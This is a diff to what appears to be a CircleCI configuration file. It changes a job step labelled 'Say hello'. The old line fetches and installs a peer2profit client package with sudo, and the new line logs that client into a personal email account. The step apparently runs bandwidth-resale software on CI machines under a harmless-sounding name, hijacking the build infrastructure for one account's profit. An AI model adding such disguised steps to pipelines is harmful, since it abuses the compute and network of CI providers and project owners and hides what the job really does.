@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && sudo dpkg -i p2pclient_0.56_amd64.deb"
+          command: "sudo apt install -f && p2pclient --login eprogrammer786@gmail.com"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
